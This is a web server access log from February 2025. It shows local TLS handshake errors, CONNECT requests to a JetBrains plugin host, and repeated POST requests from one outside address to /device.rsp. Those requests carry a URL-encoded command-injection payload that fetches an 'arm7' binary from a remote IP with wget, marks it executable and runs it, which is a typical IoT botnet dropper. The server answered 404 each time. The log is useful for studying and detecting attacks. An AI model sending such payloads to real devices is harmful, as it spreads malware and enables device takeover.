127.0.0.1 - - [18/Feb/2025:22:15:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:15:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:15:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:15:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:15:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:15:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:15:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:15:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:15:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:15:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:15:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:15:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:15:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:15:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:15:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
91.224.92.10 - - [18/Feb/2025:22:16:48 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
91.224.92.10 - - [18/Feb/2025:22:18:36 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
205.210.31.79 - - [18/Feb/2025:22:20:11 +0300] "\x16\x03\x01" 400 226
205.210.31.79 - - [18/Feb/2025:22:21:01 +0300] "-" 408 -
127.0.0.1 - - [18/Feb/2025:22:24:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:24:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
91.224.92.10 - - [18/Feb/2025:22:25:08 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [18/Feb/2025:22:25:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:25:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:25:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:25:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:25:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:25:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:25:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:25:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:25:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:25:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:25:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:25:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:25:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:25:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:25:56 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [18/Feb/2025:22:25:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:25:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:25:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:25:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:25:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
91.224.92.10 - - [18/Feb/2025:22:28:46 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [18/Feb/2025:22:30:17 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [18/Feb/2025:22:30:17 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:30:17 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [18/Feb/2025:22:30:17 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:30:17 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [18/Feb/2025:22:30:18 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:30:18 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [18/Feb/2025:22:30:18 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [18/Feb/2025:22:30:18 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:30:18 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:30:18 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67233
127.0.0.1 - - [18/Feb/2025:22:30:18 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:30:18 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67232
127.0.0.1 - - [18/Feb/2025:22:30:18 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:30:18 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 200 67232
127.0.0.1 - - [18/Feb/2025:22:30:18 +0300] "\x16\x03\x03\x01\x8c\x01" 400 226
91.224.92.10 - - [18/Feb/2025:22:34:11 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [18/Feb/2025:22:34:56 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:34:56 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [18/Feb/2025:22:34:56 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
